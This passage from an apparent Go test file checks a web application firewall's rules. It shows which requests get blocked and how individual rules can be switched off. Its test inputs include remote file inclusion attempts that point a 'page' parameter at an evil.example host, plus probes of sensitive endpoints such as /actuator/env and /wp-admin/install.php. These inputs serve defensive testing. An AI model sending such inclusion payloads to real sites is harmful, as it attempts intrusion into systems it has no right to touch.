		"include with a bracket index": {inc("page[0]", "http://evil.example/x"), nil, 403},
		"this site in page":            {inc("page", "https://shop.example.test/about"), nil, 200},
		"this site in a text file":     {"/x?u=" + url.QueryEscape("https://shop.example.test/robots.txt"), nil, 200},
		"a subdomain of this site":     {"/x?u=" + url.QueryEscape("ftp://files.shop.example.test/x"), nil, 200},
		"a page on another site":       {"/x?u=" + url.QueryEscape("https://www.example.org/page.html"), nil, 200},
		"a path":                       {inc("page", "reports/2024/q1"), nil, 200},
	} {
		t.Run(name, func(t *testing.T) {
			if got := do(t, srv, "GET", tc.target, "", "", tc.headers); got != tc.want {
				t.Errorf("status %d, want %d", got, tc.want)
			}
		})
	}
}

func TestSingleLocalRulesCanBeSwitchedOff(t *testing.T) {
	s := crs.DefaultSettings()
	s.LocalRulesOff = []int{5006012, 5006015}
	srv, _ := serve(t, s)
	for name, tc := range map[string]struct {
		target string
		want   int
	}{
		"a rule switched off":                {"/actuator/env", 200},
		"a chained rule switched off":        {"/index.php?page=" + url.QueryEscape("https://evil.example/x"), 200},
		"a rule left on":                     {"/wp-admin/install.php", 403},
		"another rule on the same parameter": {"/index.php?page=" + url.QueryEscape("ftp://evil.example/x"), 403},
	} {
		t.Run(name, func(t *testing.T) {
			if got := do(t, srv, "GET", tc.target, "", "", nil); got != tc.want {
				t.Errorf("status %d, want %d", got, tc.want)
			}
		})
	}
}
